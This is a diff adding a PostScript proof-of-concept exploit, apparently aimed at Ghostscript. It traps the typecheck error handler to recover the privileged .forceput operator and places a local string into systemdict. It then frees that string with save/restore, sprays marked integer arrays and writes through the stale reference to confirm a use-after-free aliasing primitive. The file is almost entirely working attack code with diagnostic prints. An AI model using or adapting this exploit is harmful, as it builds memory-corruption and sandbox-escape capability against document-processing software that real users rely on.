@@ -1,0 +1,86 @@
+%!PS
+% Writeup-style marker scan: recover .forceput to place a local 2048-byte string
+% in systemdict, restore to free it, allocate many fresh int arrays, then scan
+% the stale string for 0x12345678 byte patterns. Flip one low byte through the
+% stale reference and find the live array element that changed.
+/LoaderOriginalTypecheck errordict /typecheck get def
+errordict /typecheck {
+  userdict /LoaderTrapPhase known
+    { userdict /LoaderTrapPhase get } { false } ifelse
+  {
+    userdict /LoaderTrapPhase false put
+    pop pop pop pop pop
+    userdict /ForceTarget get
+    userdict /ForceKey get
+    userdict /ForceValue get
+  } { LoaderOriginalTypecheck } ifelse
+} bind put
+userdict /QUIET true put
+userdict /ForceTarget systemdict put
+userdict /ForceKey /GS_UAF_SCAN put
+userdict /LoaderTrapPhase true put
+
+(GS_FONT_PATH) getenv { /GSFontPath exch def } { (ENV_MISSING) = quit } ifelse
+userdict /Fontmap 20 dict put
+userdict /Fontmap get /NimbusSans-Regular [ GSFontPath ] put
+
+/MARK 305419896 def      % 0x12345678
+/MARK2 305419897 def     % 0x12345679
+/NARRS 96 def
+/ARRLEN 128 def          % 128 refs * 16 bytes = 2048 bytes
+/arrs NARRS array def
+
+/AttackSave save def
+userdict /ForceValue 2048 string put
+{ /NimbusSans-Regular findfont pop } stopped pop
+AttackSave restore
+
+/sv systemdict /GS_UAF_SCAN get def
+(SV_TYPE=) print sv type == flush
+(SV_LEN=) print sv length == flush
+
+0 1 NARRS 1 sub {
+  /ai exch def
+  /a ARRLEN array def
+  0 1 ARRLEN 1 sub { /j exch def a j MARK put } for
+  arrs ai a put
+} for
+(ARRS_ALLOCATED=) print NARRS == flush
+
+/found -1 def
+0 1 sv length 4 sub {
+  /p exch def
+  sv p get 120 eq {
+    sv p 1 add get 86 eq {
+      sv p 2 add get 52 eq {
+        sv p 3 add get 18 eq {
+          /found p def
+          exit
+        } if
+      } if
+    } if
+  } if
+} for
+(FOUND_OFFSET=) print found == flush
+
+found -1 ne {
+  sv found 121 put
+  (STALE_BYTE_WRITTEN=) print sv found get == flush
+  /hit false def
+  /hi -1 def
+  /hj -1 def
+  0 1 NARRS 1 sub {
+    /ai exch def
+    hit { exit } if
+    0 1 ARRLEN 1 sub {
+      /j exch def
+      arrs ai get j get MARK2 eq {
+        /hit true def /hi ai def /hj j def
+        exit
+      } if
+    } for
+  } for
+  (ALIAS_FOUND=) print hit == flush
+  hit { (ALIAS_ARRAY=) print hi == flush (ALIAS_INDEX=) print hj == flush } if
+} if
+quit
